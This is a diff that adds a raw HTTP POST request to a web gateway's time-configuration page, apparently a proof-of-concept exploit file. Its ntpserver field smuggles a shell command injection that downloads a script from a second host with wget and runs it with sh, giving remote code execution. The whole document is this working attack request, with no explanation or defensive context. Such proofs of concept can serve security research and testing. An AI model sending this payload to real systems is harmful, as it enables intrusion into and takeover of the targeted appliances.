@@ -1,0 +1,15 @@
+POST /spywall/timeConfig.php HTTP/1.1
+Host: 192.168.216.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+Origin: https://192.168.216.133
+Connection: close
+Referer: https://192.168.216.133/spywall/timeConfig.php
+Cookie: PHPSESSID=8f076c1f7bac2b403cf39711fd301533
+Upgrade-Insecure-Requests: 1
+
+posttime=1585228657&saveForm=Save&timesync=1&ntpserver=qweqwe.com;$(wget%20http://192.168.1.170/a.sh%20-O%20/tmp/a.sh;sh%20/tmp/a.sh);#&timezone=5
